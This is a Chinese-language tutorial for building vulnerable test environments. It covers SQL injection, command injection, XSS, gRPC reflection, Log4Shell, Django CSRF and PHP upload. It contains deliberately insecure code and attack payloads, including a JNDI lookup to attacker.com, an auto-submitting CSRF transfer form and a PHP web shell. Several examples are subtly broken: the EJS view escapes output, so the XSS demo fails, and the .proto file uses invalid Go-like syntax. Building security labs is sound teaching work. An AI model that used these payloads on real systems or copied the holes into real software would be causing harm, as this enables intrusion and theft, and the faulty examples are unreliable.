# 漏洞环境模拟和搭建示例

## 1. SQL注入环境搭建

### 1.1 创建测试数据库
```sql
CREATE DATABASE test_db;
USE test_db;
CREATE TABLE users (id INT PRIMARY KEY, username VARCHAR(50), password VARCHAR(50));
INSERT INTO users VALUES (1, 'admin', 'password123'), (2, 'user', 'user123');
```

### 1.2 搭建测试环境
```bash
# 使用Docker搭建测试环境
docker run -d --name sql-injection-test -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=test_db mysql:5.7
```

### 1.3 编写测试脚本
```javascript
// test-sql-injection.js
const mysql = require('mysql');
const express = require('express');
const app = express();

const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'root',
  database: 'test_db'
});

app.get('/user', (req, res) => {
  const userID = req.query.id;
  const query = `SELECT * FROM users WHERE id = ${userID}`;
  db.query(query, (err, results) => {
    if (err) throw err;
    res.json(results);
  });
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

### 1.4 测试漏洞
```bash
# 启动测试服务
node test-sql-injection.js

# 测试SQL注入
curl "http://localhost:3000/user?id=1 OR 1=1"
```

## 2. 命令注入环境搭建

### 2.1 编写测试脚本
```python
# test-command-injection.py
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host')
    command = f"ping -c 4 {host}"
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return e.output

if __name__ == '__main__':
    app.run(port=3000)
```

### 2.2 测试漏洞
```bash
# 启动测试服务
python test-command-injection.py

# 测试命令注入
curl "http://localhost:3000/ping?host=127.0.0.1; ls -la"
```

## 3. 跨站脚本(XSS)环境搭建

### 3.1 编写测试脚本
```javascript
// test-xss.js
const express = require('express');
const mysql = require('mysql');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');

const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'root',
  database: 'test_db'
});

// 创建comments表
db.query('CREATE TABLE IF NOT EXISTS comments (id INT AUTO_INCREMENT PRIMARY KEY, content TEXT)', (err) => {
  if (err) throw err;
});

app.post('/comments', (req, res) => {
  const comment = req.body.comment;
  db.query('INSERT INTO comments (content) VALUES (?)', [comment], (err) => {
    if (err) throw err;
    res.redirect('/comments');
  });
});

app.get('/comments', (req, res) => {
  db.query('SELECT * FROM comments', (err, results) => {
    if (err) throw err;
    res.render('comments', { comments: results });
  });
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

### 3.2 创建视图文件
```html
<!-- views/comments.ejs -->
<!DOCTYPE html>
<html>
<head>
  <title>Comments</title>
</head>
<body>
  <h1>Comments</h1>
  <form action="/comments" method="post">
    <textarea name="comment" placeholder="Add a comment"></textarea>
    <button type="submit">Submit</button>
  </form>
  <div>
    <% comments.forEach(comment => { %>
      <div><%= comment.content %></div>
    <% }); %>
  </div>
</body>
</html>
```

### 3.3 测试漏洞
```bash
# 启动测试服务
node test-xss.js

# 访问 http://localhost:3000/comments 并提交恶意评论
# 恶意评论内容：<script>alert('XSS')</script>
```

## 4. Go语言gRPC服务环境搭建

### 4.1 编写测试服务
```go
// cmd/server/main.go
package main

import (
	"context"
	"log"
	"net"

	"google.golang.org/grpc"
	"google.golang.org/grpc/reflection"

	"example.com/grpc-service/api"
)

// UserService 实现 api.UserServiceServer 接口
type UserService struct{}

// GetUser 实现获取用户的方法
func (s *UserService) GetUser(ctx context.Context, req *api.GetUserRequest) (*api.GetUserResponse, error) {
	return &api.GetUserResponse{
		Id:       req.Id,
		Username: "testuser",
		Email:    "test@example.com",
	}, nil
}

func main() {
	// 创建gRPC服务器
	server := grpc.NewServer()
	
	// 注册服务
	api.RegisterUserServiceServer(server, &UserService{})
	
	// ❌ 危险：启用反射功能，可能导致服务信息泄露
	reflection.Register(server)
	
	// 启动服务器
	listener, err := net.Listen("tcp", ":50051")
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}
	
	log.Println("Server listening on port 50051")
	if err := server.Serve(listener); err != nil {
		log.Fatalf("Failed to serve: %v", err)
	}
}
```

### 4.2 编写API定义
```protobuf
// api/user.proto
syntax = "proto3";

package api;

option go_package = "example.com/grpc-service/api";

// UserService 定义用户服务
service UserService {
  // GetUser 获取用户信息
  rpc GetUser (GetUserRequest) returns (GetUserResponse);
}

// GetUserRequest 获取用户请求
type GetUserRequest struct {
  int32 id = 1;
}

// GetUserResponse 获取用户响应
type GetUserResponse struct {
  int32 id = 1;
  string username = 2;
  string email = 3;
}
```

### 4.3 测试漏洞
```bash
# 编译并运行服务
go run cmd/server/main.go

# 使用grpc_cli工具获取服务列表
grpc_cli ls localhost:50051

# 获取服务方法
grpc_cli ls localhost:50051 example.com.grpc_service.api.UserService

# 获取方法详情
grpc_cli describe localhost:50051 example.com.grpc_service.api.UserService.GetUser

# 调用方法（如果不需要认证）
grpc_cli call localhost:50051 example.com.grpc_service.api.UserService.GetUser "id: 1"
```

## 5. Java Log4Shell环境搭建

### 5.1 编写测试应用
```java
// App.java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);
    
    public static void main(String[] args) {
        String userInput = args[0];
        // ❌ 危险：直接记录用户输入
        logger.info("User input: {}", userInput);
        System.out.println("Application finished");
    }
}
```

### 5.2 编译和运行
```bash
# 编译应用
javac -cp "log4j-core-2.14.1.jar:log4j-api-2.14.1.jar" App.java

# 运行应用，触发漏洞
java -cp ".:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar" App "${jndi:ldap://attacker.com:1389/exploit}"
```

## 6. Python Django CSRF环境搭建

### 6.1 创建Django项目
```bash
# 创建Django项目
django-admin startproject csrf_test
cd csrf_test

# 创建应用
python manage.py startapp transfers
```

### 6.2 编写视图
```python
# transfers/views.py
from django.http import HttpResponse

def transfer_money(request):
    # ❌ 危险：未检查CSRF令牌
    if request.method == 'POST':
        amount = request.POST.get('amount')
        recipient = request.POST.get('recipient')
        # 执行转账操作
        return HttpResponse('Transfer successful')
    return HttpResponse('GET request not allowed')
```

### 6.3 配置URL
```python
# csrf_test/urls.py
from django.contrib import admin
from django.urls import path
from transfers.views import transfer_money

urlpatterns = [
    path('admin/', admin.site.urls),
    path('transfer/', transfer_money),
]
```

### 6.4 测试漏洞
```bash
# 启动开发服务器
python manage.py runserver

# 创建测试页面，提交恶意请求
# 恶意页面内容：
# <form action="http://localhost:8000/transfer/" method="post">
#     <input type="hidden" name="amount" value="1000">
#     <input type="hidden" name="recipient" value="attacker">
#     <input type="submit" value="Click here for a free prize">
# </form>
# <script>document.forms[0].submit();</script>
```

## 7. PHP文件上传环境搭建

### 7.1 编写上传脚本
```php
<!-- upload.php -->
<!DOCTYPE html>
<html>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
  Select image to upload:
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $target_dir = "uploads/";
    if (!file_exists($target_dir)) {
        mkdir($target_dir, 0777, true);
    }
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
    
    // ❌ 危险：未验证文件类型
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}
?>
```

### 7.2 测试漏洞
```bash
# 启动PHP服务器
php -S localhost:8000

# 访问 http://localhost:8000/upload.php 并上传恶意PHP文件
# 恶意文件内容：<?php system($_GET['cmd']); ?>

# 访问上传的文件，执行命令
# curl "http://localhost:8000/uploads/shell.php?cmd=ls -la"
```